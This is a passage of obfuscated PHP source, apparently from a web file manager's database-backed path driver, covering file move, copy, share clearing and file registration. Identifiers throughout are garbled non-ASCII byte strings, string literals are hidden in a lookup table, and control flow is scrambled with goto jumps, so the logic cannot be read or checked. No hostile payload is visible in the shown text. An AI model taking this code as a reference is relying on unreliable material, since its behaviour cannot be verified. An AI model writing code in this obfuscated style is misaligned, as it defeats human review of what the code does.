$D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [457]], $FÜÜÌÉ≤∑ë); Hook::trigger($Cœœ∫—Ø⁄ [528], $Fà„ﬂÉÍèÇ); return $B¥ ∞∂≠ƒ¬; goto a£‘ﬁ¬è†á; b∂øê’ë™ˆ: $Fà„ﬂÉÍèÇ = $this->pathInfoMore($e…ÜÛ°Ö≥æ); if ($this->isParentOf($e…ÜÛ°Ö≥æ, $FÜÜÌÉ≤∑ë)) { return !1; } if (!$D¶Ö¯é´≈ƒ || !$aøﬁ£»ÜõË || $aøﬁ£»ÜõË[$Cœœ∫—Ø⁄ [367]] != $Cœœ∫—Ø⁄ [83]) { return !1; } goto c∂øú¢‹¡¶; cÖÑ·åıêä: $B¥ ∞∂≠ƒ¬ = $this->_move($e…ÜÛ°Ö≥æ, $FÜÜÌÉ≤∑ë, $Bº—ÙÊ¯ˆÂ, $aôÔÛ™¡€‹, $EÇÓË„◊©≥); $this->sourceCacheClear(); if ($D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [367]] == $Cœœ∫—Ø⁄ [83] && $b£⁄´ŒôåÖ) { $this->folderSizeResetChildren($B¥ ∞∂≠ƒ¬); } goto fó›ü‹Â∫æ; c∂øú¢‹¡¶: Hook::trigger($Cœœ∫—Ø⁄ [527], $Fà„ﬂÉÍèÇ); $this->targetIsDelete = intval($D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [393]]); if ($D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [457]] == $FÜÜÌÉ≤∑ë && $EÇÓË„◊©≥ != $D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [28]]) { $Bö¶©ã°Ùˆ = $this->fileNameExist($FÜÜÌÉ≤∑ë, $EÇÓË„◊©≥); if ($Bö¶©ã°Ùˆ && $D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [367]] == $Cœœ∫—Ø⁄ [464]) { goto C¢ÕŸÒü÷ˆ; a„êÚ°˜¥—: $this->removeNow($e…ÜÛ°Ö≥æ, !1); $this->folderSizeReset($FÜÜÌÉ≤∑ë); Hook::trigger($Cœœ∫—Ø⁄ [528], $Fà„ﬂÉÍèÇ); goto dªõäöüï±; dªõäöüï±: return $Bö¶©ã°Ùˆ; goto FÇá„ˆÑÊû; C¢ÕŸÒü÷ˆ: $C…¡¬üƒí¯ = $this->sourceInfo($Bö¶©ã°Ùˆ); $F√≠‹ç¿úÂ = $this->fileHistory($C…¡¬üƒí¯, $D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [415]], $D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [77]]); if (!$F√≠‹ç¿úÂ) { Model($Cœœ∫—Ø⁄ [418])->remove($D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [415]]); } goto a„êÚ°˜¥—; FÇá„ˆÑÊû: } } goto bú™Ü›Ø›»; AæÀ≈Ú£Ë°: $this->lockWriteEnd($FÜÜÌÉ≤∑ë, $dÓèàªÿîí); $this->folderSizeReset($D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [457]]); $this->folderSizeReset($FÜÜÌÉ≤∑ë); goto c⁄·á≠áé; c⁄·á≠áé: $a¯˜√ö≠êé = array($D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [457]], $FÜÜÌÉ≤∑ë); if ($D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [367]] == $Cœœ∫—Ø⁄ [83]) { $a¯˜√ö≠êé[] = $e…ÜÛ°Ö≥æ; } $this->updateModifyTime($a¯˜√ö≠êé); goto CãœÇ¨ÂŸœ; a£‘ﬁ¬è†á: } private function _move($Bø»Í‚éËõ, $càŒµºüèñ, $Cñ’âΩúã•, &$F€¶¬‹÷«ì, $eÁãò¢Â≥‡ = '') { goto b£ãììÖá∏; b£ãììÖá∏: $E¶Ü˘≈€ÛŒ =& $_SERVER[—Ω]; $aÇáàÇ„¯∫ = $this->sourceInfo($Bø»Í‚éËõ); $AÀ«ÉıàÈÊ = $aÇáàÇ„¯∫[$E¶Ü˘≈€ÛŒ[367]] == $E¶Ü˘≈€ÛŒ[83]; goto d±ë±Üó©; d±ë±Üó©: $d∏å√«≠èﬁ = $eÁãò¢Â≥‡ ? $eÁãò¢Â≥‡ : $aÇáàÇ„¯∫[$E¶Ü˘≈€ÛŒ[28]]; $D¶©øà£¥ÿ = $this->fileNameExistCache($càŒµºüèñ, $d∏å√«≠èﬁ); $this->lockMoveStart($Bø»Í‚éËõ); goto a“¬‹¡œèÁ; eÀ¨⁄Çõ§Ñ: $Aπ¬£¶• ê = !1; if ($AÀ«ÉıàÈÊ) { if ($Cñ’âΩúã• == REPEAT_RENAME_FOLDER) { $d∏å√«≠èﬁ = $this->fileNameAuto($càŒµºüèñ, $d∏å√«≠èﬁ, $Cñ’âΩúã•, $AÀ«ÉıàÈÊ); $eÕ∞õ»è¢ÿ = $this->_moveForce($Bø»Í‚éËõ, $càŒµºüèñ, $d∏å√«≠èﬁ); } else { if ($Cñ’âΩúã• == REPEAT_RENAME_FOLDER) { $Cñ’âΩúã• = REPEAT_RENAME; } $e‘≤ÛÖ≤≤ = $this->_childrenListSelect($Bø»Í‚éËõ); foreach ($e‘≤ÛÖ≤≤ as $AœåÂ∂á˘Â) { $this->_move($AœåÂ∂á˘Â[$E¶Ü˘≈€ÛŒ[366]], $D¶©øà£¥ÿ, $Cñ’âΩúã•, $F€¶¬‹÷«ì); } $Aπ¬£¶• ê = !0; } } else { if ($Cñ’âΩúã• == REPEAT_SKIP) { $Aπ¬£¶• ê = !0; } else { if ($Cñ’âΩúã• == REPEAT_RENAME || $Cñ’âΩúã• == REPEAT_RENAME_FOLDER) { $d∏å√«≠èﬁ = $this->fileNameAuto($càŒµºüèñ, $d∏å√«≠èﬁ, $Cñ’âΩúã•, $AÀ«ÉıàÈÊ); $eÕ∞õ»è¢ÿ = $this->_moveForce($Bø»Í‚éËõ, $càŒµºüèñ, $d∏å√«≠èﬁ); } else { if ($Cñ’âΩúã• == REPEAT_REPLACE) { $C°ÚüªæíÒ = $this->sourceInfoCache($D¶©øà£¥ÿ); $a∞ÑÀ™‹Ï‚ = $this->fileHistory($C°ÚüªæíÒ, $aÇáàÇ„¯∫[$E¶Ü˘≈€ÛŒ[415]], $aÇáàÇ„¯∫[$E¶Ü˘≈€ÛŒ[77]]); if ($a∞ÑÀ™‹Ï‚) { $F€¶¬‹÷«ì[$E¶Ü˘≈€ÛŒ[497]][] = $aÇáàÇ„¯∫[$E¶Ü˘≈€ÛŒ[415]]; } else { $Aπ¬£¶• ê = !0; } } } } } if ($Aπ¬£¶• ê && !$F€¶¬‹÷«ì[$E¶Ü˘≈€ÛŒ[529]]) { $F€¶¬‹÷«ì[$E¶Ü˘≈€ÛŒ[529]] = !0; } goto DﬂÛøΩ¯ç·; DﬂÛøΩ¯ç·: return $eÕ∞õ»è¢ÿ; goto cÜì”ò…†¬; a“¬‹¡œèÁ: $this->lockWriteStart($càŒµºüèñ, $d∏å√«≠èﬁ); if (!$D¶©øà£¥ÿ) { return $this->_moveForce($Bø»Í‚éËõ, $càŒµºüèñ, $d∏å√«≠èﬁ); } $eÕ∞õ»è¢ÿ = $D¶©øà£¥ÿ; goto eÀ¨⁄Çõ§Ñ; cÜì”ò…†¬: } private function _moveForce($A·÷´ÓΩçº, $F≥≈‹ÎÇà‹, $C©ˆ⁄¿∞‹π) { goto aÇ‰™ı¿„É; cì›ƒ∑©¶™: $EÑÇæ®¶√“ = $CêãåÍöîÆ[$BËˆƒ¡©û©[367]] == $BËˆƒ¡©û©[83]; $C‘èÎÂ∞ ì = array($BËˆƒ¡©û©[365] => $eŸ„√ÚØï¬[$BËˆƒ¡©û©[366]], $BËˆƒ¡©û©[521] => $eŸ„√ÚØï¬[$BËˆƒ¡©û©[455]] . $eŸ„√ÚØï¬[$BËˆƒ¡©û©[366]] . $BËˆƒ¡©û©[47], $BËˆƒ¡©û©[517] => $eŸ„√ÚØï¬[$BËˆƒ¡©û©[368]], $BËˆƒ¡©û©[518] => $eŸ„√ÚØï¬[$BËˆƒ¡©û©[452]], $BËˆƒ¡©û©[520] => USER_ID, $BËˆƒ¡©û©[383] => $C©ˆ⁄¿∞‹π); $DÿÖÊ≠’ûï = $CêãåÍöîÆ[$BËˆƒ¡©û©[368]] == SourceModel::TYPE_GROUP && $eŸ„√ÚØï¬[$BËˆƒ¡©û©[368]] == SourceModel::TYPE_GROUP && $CêãåÍöîÆ[$BËˆƒ¡©û©[452]] == $eŸ„√ÚØï¬[$BËˆƒ¡©û©[452]]; goto a⁄±êÕº˘Ò; aÇ‰™ı¿„É: $BËˆƒ¡©û© =& $_SERVER[—Ω]; $CêãåÍöîÆ = $this->sourceInfo($A·÷´ÓΩçº); $eŸ„√ÚØï¬ = $this->sourceInfo($F≥≈‹ÎÇà‹); goto cì›ƒ∑©¶™; aÍáæÇçÔá: if ($EÑÇæ®¶√“) { $Aå£ÜëÜÑŸ = array($BËˆƒ¡©û©[521] => array($BËˆƒ¡©û©[479], $CêãåÍöîÆ[$BËˆƒ¡©û©[455]] . $CêãåÍöîÆ[$BËˆƒ¡©û©[366]] . $BËˆƒ¡©û©[480])); $D‘ÍÓ◊‹∆Í = $CêãåÍöîÆ[$BËˆƒ¡©û©[455]] . $CêãåÍöîÆ[$BËˆƒ¡©û©[366]] . $BËˆƒ¡©û©[47]; $cÜâ®‹Ö»¡ = $eŸ„√ÚØï¬[$BËˆƒ¡©û©[455]] . $eŸ„√ÚØï¬[$BËˆƒ¡©û©[366]] . $BËˆƒ¡©û©[47] . $CêãåÍöîÆ[$BËˆƒ¡©û©[366]] . $BËˆƒ¡©û©[47]; $Cç…ôäôÂä = array($BËˆƒ¡©û©[521] => array($BËˆƒ¡©û©[530], "\x72\x65\x70\x6c\x61\x63\x65\50\160\x61\162\145\156\x74\x4c\x65\x76\145\x6c\x2c\x27{$D‘ÍÓ◊‹∆Í}\47\x2c\x27{$cÜâ®‹Ö»¡}\x27\x29"), $BËˆƒ¡©û©[517] => $eŸ„√ÚØï¬[$BËˆƒ¡©û©[368]], $BËˆƒ¡©û©[518] => $eŸ„√ÚØï¬[$BËˆƒ¡©û©[452]]); if ($DÖ˘Ü∏˜ï¡) { $Cç…ôäôÂä[$BËˆƒ¡©û©[392]] = 0; } $this->where($Aå£ÜëÜÑŸ)->data($Cç…ôäôÂä)->save(); } $this->where(array($BËˆƒ¡©û©[380] => $A·÷´ÓΩçº))->data($C‘èÎÂ∞ ì)->save(); return $A·÷´ÓΩçº; goto aù›ŒìÚüà; a⁄±êÕº˘Ò: if (!$DÿÖÊ≠’ûï) { Model($BËˆƒ¡©û©[450])->authClear($A·÷´ÓΩçº); } $DÖ˘Ü∏˜ï¡ = $CêãåÍöîÆ[$BËˆƒ¡©û©[393]] == $BËˆƒ¡©û©[83] && $eŸ„√ÚØï¬[$BËˆƒ¡©û©[393]] != $BËˆƒ¡©û©[83]; if ($DÖ˘Ü∏˜ï¡) { $C‘èÎÂ∞ ì[$BËˆƒ¡©û©[392]] = 0; } goto aÍáæÇçÔá; aù›ŒìÚüà: } private function clearShare($bø„àä„¥œ, $AµÖ’Öï‡) { goto BÀªß≠ø⁄π; BÀªß≠ø⁄π: $dàˆÿßﬂŒ„ =& $_SERVER[—Ω]; $aø„∫Ì–Ë˜ = $this->sourceInfo($bø„àä„¥œ); $EÈÁ—ìÀèÔ = $this->sourceInfo($AµÖ’Öï‡); goto c¶¢àÕ£©º; A‡–úñéçÖ: if (!$EÊâÉÇÂ◊Œ) { return; } $EÊâÉÇÂ◊Œ = array_to_keyvalue($EÊâÉÇÂ◊Œ, $dàˆÿßﬂŒ„[33], $dàˆÿßﬂŒ„[437]); $DçÃ„‚∞çè = array($dàˆÿßﬂŒ„[437] => array($dàˆÿßﬂŒ„[7], $EÊâÉÇÂ◊Œ)); goto DûÌõÈ∞èå; c¶¢àÕ£©º: if ($aø„∫Ì–Ë˜[$dàˆÿßﬂŒ„[452]] == $EÈÁ—ìÀèÔ[$dàˆÿßﬂŒ„[452]] && $aø„∫Ì–Ë˜[$dàˆÿßﬂŒ„[368]] == $dàˆÿßﬂŒ„[531]) { return; } $DçÃ„‚∞çè = array($dàˆÿßﬂŒ„[455] => array($dàˆÿßﬂŒ„[479], $aø„∫Ì–Ë˜[$dàˆÿßﬂŒ„[455]] . $bø„àä„¥œ . $dàˆÿßﬂŒ„[480])); $CﬁÃ»¨§ñÆ = $this->field($dàˆÿßﬂŒ„[380])->where($DçÃ„‚∞çè)->getField($dàˆÿßﬂŒ„[366], !0); goto EÒ¬Û£¿ü∞; DûÌõÈ∞èå: Model($dàˆÿßﬂŒ„[532])->where($DçÃ„‚∞çè)->save(array($dàˆÿßﬂŒ„[444] => 0)); Model($dàˆÿßﬂŒ„[533])->where($DçÃ„‚∞çè)->delete(); goto E‰™œï®Ωı; EÒ¬Û£¿ü∞: if (!$CﬁÃ»¨§ñÆ) { return; } $DçÃ„‚∞çè = array($dàˆÿßﬂŒ„[366] => array($dàˆÿßﬂŒ„[7], $CﬁÃ»¨§ñÆ), $dàˆÿßﬂŒ„[444] => 1); $EÊâÉÇÂ◊Œ = Model($dàˆÿßﬂŒ„[532])->field($dàˆÿßﬂŒ„[437])->where($DçÃ„‚∞çè)->select(); goto A‡–úñéçÖ; E‰™œï®Ωı: } public function copyFolderFromIO($EÉßÊ‚Œ®÷, $bÇ•ù˜øõø, $Dêö¬ôœ‘ó, $E∆›·’ À„, $A”àÊÂ€¨Ì, $F›ÂÑî£í® = false) { goto Bùõèó›êò; B¶Õ™«≥üë: Hook::trigger($B∑ç‹çàùô[536]); if ($bˆòëëéŸî) { $this->folderSizeResetChildren($bˆòëëéŸî); } $this->_childrenListClear(); goto D”âáæﬂâ£; F¨Ø‚‹®éœ: if ($B¥òπûÒπ∫) { $this->_childrenAllMake($B¥òπûÒπ∫); } Hook::trigger($B∑ç‹çàùô[535]); $this->_copyChildTo($EÉßÊ‚Œ®÷, $bÇ•ù˜øõø, $bˆòëëéŸî, $E∆›·’ À„, $a—áç—ùœ…, $A”àÊÂ€¨Ì); goto B¶Õ™«≥üë; c·“æ´Ô¡Ò: Model($B∑ç‹çàùô[418])->linkAdd($a—áç—ùœ…[$B∑ç‹çàùô[497]]); Model($B∑ç‹çàùô[418])->remove($a—áç—ùœ…[$B∑ç‹çàùô[534]]); $this->folderSizeReset($Dêö¬ôœ‘ó); goto fòÊî¥≥»Á; Bùõèó›êò: $B∑ç‹çàùô =& $_SERVER[—Ω]; $a—áç—ùœ… = array($B∑ç‹çàùô[498] => array(), $B∑ç‹çàùô[499] => array(), $B∑ç‹çàùô[497] => array(), $B∑ç‹çàùô[534] => array()); $EÈ∂∆∑›ƒ‹ = $F›ÂÑî£í® ? $F›ÂÑî£í® : $EÉßÊ‚Œ®÷->getPathName($EÉßÊ‚Œ®÷->pathThis($bÇ•ù˜øõø)); goto eç™ìîê“»; D”âáæﬂâ£: Model($B∑ç‹çàùô[500])->addAll($a—áç—ùœ…[$B∑ç‹çàùô[498]], array(), !0); Model($B∑ç‹çàùô[501])->eventCopy($bˆòëëéŸî); $this->saveAll($a—áç—ùœ…[$B∑ç‹çàùô[499]]); goto c·“æ´Ô¡Ò; eç™ìîê“»: $B¥òπûÒπ∫ = $this->fileNameExist($Dêö¬ôœ‘ó, $EÈ∂∆∑›ƒ‹); $bˆòëëéŸî = $this->mkdir($Dêö¬ôœ‘ó, $EÈ∂∆∑›ƒ‹, $E∆›·’ À„); if (!$B¥òπûÒπ∫ || $E∆›·’ À„ == REPEAT_RENAME_FOLDER) { $E∆›·’ À„ = !1; } goto F¨Ø‚‹®éœ; fòÊî¥≥»Á: $this->updateModifyTime($Dêö¬ôœ‘ó); return $bˆòëëéŸî; goto Dü∏∫⁄Ãó¨; Dü∏∫⁄Ãó¨: } private function _copyChildTo($aÛç√ü⁄ÂÔ, $B≈ÓÆÛŒ÷õ, $Eñãû€”äÁ, $a—¯ˆÕö°ª, &$fö∞∏è¿éõ, $dÖÍ“ÖÌ—¶) { goto Fäﬂˆ…È¬é; e‰®àÇà«Ø: foreach ($BÁ⁄ﬂÂìå£ as &$C‚÷°ºπ±∑) { goto aò†Ïÿ—–¿; c∞î†à¿í∆: $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[77]] = _get($C‚÷°ºπ±∑, $E˜ÓÜÇÕäå[77], 0); $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[415]] = _get($C‚÷°ºπ±∑, $E˜ÓÜÇÕäå[415], 0); if (!isset($C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[537]]) && $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[415]]) { $fö∞∏è¿éõ[$E˜ÓÜÇÕäå[534]][] = $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[415]]; } goto D∏ÌÑÉÊª; D∏ÌÑÉÊª: if ($a—¯ˆÕö°ª) { $E»äÍ÷êÉõ = $this->fileNameExistCache($Eñãû€”äÁ, $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[28]]); if ($E»äÍ÷êÉõ) { if ($C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[367]] || $a—¯ˆÕö°ª == REPEAT_SKIP) { continue; } if ($a—¯ˆÕö°ª == REPEAT_REPLACE) { $b°ˆè„ûíΩ = $this->sourceInfoCache($E»äÍ÷êÉõ); $Cê°´ééôÜ = $this->fileHistory($b°ˆè„ûíΩ, $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[415]], $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[77]]); if ($Cê°´ééôÜ) { $fö∞∏è¿éõ[$E˜ÓÜÇÕäå[497]][] = $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[415]]; } continue; } else { if ($a—¯ˆÕö°ª == REPEAT_RENAME) { $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[28]] = $this->fileNameAutoCache($Eñãû€”äÁ, $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[28]], $a—¯ˆÕö°ª, !1); } } } } if (!$C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[367]] && $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[415]]) { $fö∞∏è¿éõ[$E˜ÓÜÇÕäå[497]][] = $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[415]]; } $eñ÷»¢¢÷ç[] = $this->_makeItemData($C‚÷°ºπ±∑, $Bäºà≠ÿ¿˘, $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[28]]); goto F™Œé™‘ùñ; aò†Ïÿ—–¿: if (isset($fÓƒ˘æùÊÆ[$C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[28]]])) { $C‚÷°ºπ±∑ = $fÓƒ˘æùÊÆ[$C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[28]]]; } $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[367]] = $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[29]] == $E˜ÓÜÇÕäå[76]; $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[369]] = _get($C‚÷°ºπ±∑, $E˜ÓÜÇÕäå[157], $E˜ÓÜÇÕäå[33]); goto c∞î†à¿í∆; F™Œé™‘ùñ: } unset($C‚÷°ºπ±∑); if (!empty($eñ÷»¢¢÷ç)) { $this->addAll($eñ÷»¢¢÷ç); } goto BêÀ¿Ñ©–é; BêÀ¿Ñ©–é: $BÛ„ìÃúôÁ = $this->_childrenList($Eñãû€”äÁ); $BÛ„ìÃúôÁ = array_to_keyvalue($BÛ„ìÃúôÁ, $E˜ÓÜÇÕäå[28]); foreach ($BÁ⁄ﬂÂìå£ as $C‚÷°ºπ±∑) { $b°ˆè„ûíΩ = $BÛ„ìÃúôÁ[$C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[28]]]; $aé¨¨œ˜©À = $b°ˆè„ûíΩ[$E˜ÓÜÇÕäå[366]]; $this->_copyApplyMeta($b°ˆè„ûíΩ, $fö∞∏è¿éõ); if ($C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[29]] == $E˜ÓÜÇÕäå[76]) { $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[75]] = $aÛç√ü⁄ÂÔ->getPathInner($C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[75]]); $this->_copyChildTo($aÛç√ü⁄ÂÔ, $C‚÷°ºπ±∑[$E˜ÓÜÇÕäå[75]], $aé¨¨œ˜©À, $a—¯ˆÕö°ª, $fö∞∏è¿éõ, $dÖÍ“ÖÌ—¶); } } goto D’›¥òë»ú; aêÏ£Úø◊“: $BÁ⁄ﬂÂìå£ = array_merge($B’”Ï˘ê£»[$E˜ÓÜÇÕäå[73]], $B’”Ï˘ê£»[$E˜ÓÜÇÕäå[74]]); $fÓƒ˘æùÊÆ = $this->_addFiles($aÛç√ü⁄ÂÔ, $B’”Ï˘ê£»[$E˜ÓÜÇÕäå[73]], $dÖÍ“ÖÌ—¶); $eñ÷»¢¢÷ç = array(); goto e‰®àÇà«Ø; Fäﬂˆ…È¬é: $E˜ÓÜÇÕäå =& $_SERVER[—Ω]; $Bäºà≠ÿ¿˘ = $this->sourceInfoCache($Eñãû€”äÁ); $B’”Ï˘ê£» = $aÛç√ü⁄ÂÔ->listPath($B≈ÓÆÛŒ÷õ, !1, !0); goto aêÏ£Úø◊“; D’›¥òë»ú: } private function _addFiles($FÏ¢†ôÜÔü, $AåòãÃóˆ, $D™Ω£¡¢ŒÜ) { goto aÖ‡ƒ≠‹ê∞; bé«◊áÂ·à: $D∏∞¶¿ı∞§ = $Eá¯à≤ôø“->where($aΩﬂıú◊˜ˆ)->select(); $D∏∞¶¿ı∞§ = $D∏∞¶¿ı∞§ ? $D∏∞¶¿ı∞§ : array(); foreach ($D∏∞¶¿ı∞§ as $d‘Èã¿˜—Ü) { if (!isset($A®≠„Áßƒﬂ[$d‘Èã¿˜—Ü[$A≠†´Œ©Èˆ[160]]])) { continue; } $AÕ∑°É»¿™ = $A®≠„Áßƒﬂ[$d‘Èã¿˜—Ü[$A≠†´Œ©Èˆ[160]]]; foreach ($AÕ∑°É»¿™ as &$aÈ¿¢êœìÇ) { $aÈ¿¢êœìÇ[$A≠†´Œ©Èˆ[415]] = $d‘Èã¿˜—Ü[$A≠†´Œ©Èˆ[415]]; $aÈ¿¢êœìÇ[$A≠†´Œ©Èˆ[537]] = !0; } unset($aÈ¿¢êœìÇ); } goto dù¿õœÍÊù; aÖ‡ƒ≠‹ê∞: $A≠†´Œ©Èˆ =& $_SERVER[—Ω]; if (!$AåòãÃóˆ || count($AåòãÃóˆ) == 0) { return array(); } $A®≠„Áßƒﬂ = array(); goto C©ˆ¶ﬁﬂû¬; D„⁄§—Ÿ∆∏: $aΩﬂıú◊˜ˆ = array($A≠†´Œ©Èˆ[160] => array($A≠†´Œ©Èˆ[7], array_keys($A®≠„Áßƒﬂ))); $D∏∞¶¿ı∞§ = $Eá¯à≤ôø“->where($aΩﬂıú◊˜ˆ)->select(); $D∏∞¶¿ı∞§ = $D∏∞¶¿ı∞§ ? $D∏∞¶¿ı∞§ : array(); goto aöÔÜºê›ã; cø∏‘Í⁄ÁË: return $aÑÕΩ›„Ø§; goto Eò≤≈ûµèß; C©ˆ¶ﬁﬂû¬: foreach ($AåòãÃóˆ as &$aÈ¿¢êœìÇ) { goto f∑©øøƒ“⁄; bÀò≥≥µ‘ã: $aÈ¿¢êœìÇ[$A≠†´Œ©Èˆ[160]] = $cÎ…Ãﬁπﬂÿ; Hook::trigger($A≠†´Œ©Èˆ[539], $aÈ¿¢êœìÇ); $A®≠„Áßƒﬂ[$cÎ…Ãﬁπﬂÿ][] =& $aÈ¿¢êœìÇ; goto AÑ—†ûÆ≥é; f∑©øøƒ“⁄: Hook::trigger($A≠†´Œ©Èˆ[538], $aÈ¿¢êœìÇ); $aÈ¿¢êœìÇ[$A≠†´Œ©Èˆ[75]] = $FÏ¢†ôÜÔü->getPathInner($aÈ¿¢êœìÇ[$A≠†´Œ©Èˆ[75]]); $Bﬂûôó÷≥ä = $FÏ¢†ôÜÔü->hashSimple($aÈ¿¢êœìÇ[$A≠†´Œ©Èˆ[75]]); goto e£Éå´ä®Î; AÑ—†ûÆ≥é: if (count($A®≠„Áßƒﬂ[$cÎ…Ãﬁπﬂÿ]) > 1) { $aÈ¿¢êœìÇ[$A≠†´Œ©Èˆ[537]] = !0; } goto cåîæ´ïÛ⁄; e£Éå´ä®Î: $cÎ…Ãﬁπﬂÿ = $FÏ¢†ôÜÔü->hashMd5($aÈ¿¢êœìÇ[$A≠†´Œ©Èˆ[75]]); if (strlen($cÎ…Ãﬁπﬂÿ) > 10 && !isset($A®≠„Áßƒﬂ[$cÎ…Ãﬁπﬂÿ])) { $A®≠„Áßƒﬂ[$cÎ…Ãﬁπﬂÿ] = array(); } $aÈ¿¢êœìÇ[$A≠†´Œ©Èˆ[161]] = $Bﬂûôó÷≥ä; goto bÀò≥≥µ‘ã; cåîæ´ïÛ⁄: } $aΩﬂıú◊˜ˆ = array($A≠†´Œ©Èˆ[160] => array($A≠†´Œ©Èˆ[7], array_keys($A®≠„Áßƒﬂ))); $Eá¯à≤ôø“ = Model($A≠†´Œ©Èˆ[540]); goto bé«◊áÂ·à; dù¿õœÍÊù: $aÛä‹¨øﬁ∂ = array(); foreach ($AåòãÃóˆ as $e˘°£ ı‡Ó) { if (isset($e˘°£ ı‡Ó[$A≠†´Œ©Èˆ[537]]) && $e˘°£ ı‡Ó[$A≠†´Œ©Èˆ[537]]) { continue; } $FÛ·ºªÜµ« = $FÏ¢†ôÜÔü->getPathInner($e˘°£ ı‡Ó[$A≠†´Œ©Èˆ[75]]); $Fﬂ∂ùÏ„›¶ = $Eá¯à≤ôø“->addFileMake($FÛ·ºªÜµ«, $e˘°£ ı‡Ó[$A≠†´Œ©Èˆ[77]], $e˘°£ ı‡Ó[$A≠†´Œ©Èˆ[161]], $e˘°£ ı‡Ó[$A≠†´Œ©Èˆ[160]], $e˘°£ ı‡Ó[$A≠†´Œ©Èˆ[28]], $D™Ω£¡¢ŒÜ); $aÛä‹¨øﬁ∂[] = $Fﬂ∂ùÏ„›¶; } $Eá¯à≤ôø“->addAll($aÛä‹¨øﬁ∂); goto D„⁄§—Ÿ∆∏; aöÔÜºê›ã: foreach ($D∏∞¶¿ı∞§ as $d‘Èã¿˜—Ü) { if (!isset($A®≠„Áßƒﬂ[$d‘Èã¿˜—Ü[$A≠†´Œ©Èˆ[160]]])) { continue; } $E–©…≠≠¡â =& $A®≠„Áßƒﬂ[$d‘Èã¿˜—Ü[$A≠†´Œ©Èˆ[160]]]; foreach ($E–©…≠≠¡â as &$aÈ¿¢êœìÇ) { $aÈ¿¢êœìÇ[$A≠†´Œ©Èˆ[415]] = $d‘Èã¿˜—Ü[$A≠†´Œ©Èˆ[415]]; } unset($aÈ¿¢êœìÇ); } $aÑÕΩ›„Ø§ = array(); foreach ($AåòãÃóˆ as $eÒê„„ø≤Ñ) { $aÑÕΩ›„Ø§[$eÒê„„ø≤Ñ[$A≠†´Œ©Èˆ[28]]] = $eÒê„„ø≤Ñ; } goto cø∏‘Í⁄ÁË; Eò≤≈ûµèß: } } define($_SERVER[—Ω][541], $_SERVER[—Ω][542]); goto fŒ‹¥ÏöÃÇ; DóÙÓ“ßã†: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($d∑Ìó¢áÔÖ) { $this->pathParse = $d∑Ìó¢áÔÖ; $this->model = Model($_SERVER[—Ω][1114]); } public function getPath($Dâπ›´ìˆÒ) { return trim($Dâπ›´ìˆÒ, $_SERVER[—Ω][8]); } public function pathFather($cÁ‰≈ÙŸ¢ã) { $e–”¶ß©»Ñ = $this->parse($cÁ‰≈ÙŸ¢ã); $e–”¶ß©»Ñ = $this->infoSimple($cÁ‰≈ÙŸ¢ã); return $e–”¶ß©»Ñ ? $e–”¶ß©»Ñ[$_SERVER[—Ω][457]] : !1; } public function getPathName($A’íÆ¥Ã˘©) { $Aæ‡¡Ô¯ÌÀ = $this->infoSimple($A’íÆ¥Ã˘©); return $Aæ‡¡Ô¯ÌÀ ? $Aæ‡¡Ô¯ÌÀ[$_SERVER[—Ω][28]] : !1; } public function getPathOuter($eÿÚ≠¥Æ§Ê) { if (!$eÿÚ≠¥Æ§Ê) { return $eÿÚ≠¥Æ§Ê; } $FûÊøÓ◊ø‡ = $this->parse($eÿÚ≠¥Æ§Ê); return KodIO::make($FûÊøÓ◊ø‡[$_SERVER[—Ω][364]]); } public function copyFolderFromIO($E«¶ÃﬁÀ£ç, $E∂Íµàøå÷, $eﬁ€ñóôáâ, $F∑¡∂∑æ≤¢, $cÚÒ∏øÛ«Ò) { $a›ó£êË®– = $this->model->copyFolderFromIO($E«¶ÃﬁÀ£ç, $E∂Íµàøå÷, $eﬁ€ñóôáâ, $F∑¡∂∑æ≤¢, $cÚÒ∏øÛ«Ò); return KodIO::make($a›ó£êË®–); } public function isParentOf($D÷ÿÃé÷è„, $Eµ”•ËÓ±ß) { return $this->model->isParentOf($D÷ÿÃé÷è„, $Eµ”•ËÓ±ß); } public function mkfile($f≠Œõ„≤⁄¢, $f«âÚÀüµ∫ = '', $Fœÿ™◊Û∑Á = REPEAT_RENAME) { $e‹ƒ∞€ûÑõ =& $_SERVER[—Ω]; $f‘Ú≠ﬂËªê = $this->parse($f≠Œõ„≤⁄¢); $f≠Œõ„≤⁄¢ = $f‘Ú≠ﬂËªê[$e‹ƒ∞€ûÑõ[364]]; for ($fÀ…¢ñ©…¯ = 0; $fÀ…¢ñ©…¯ < 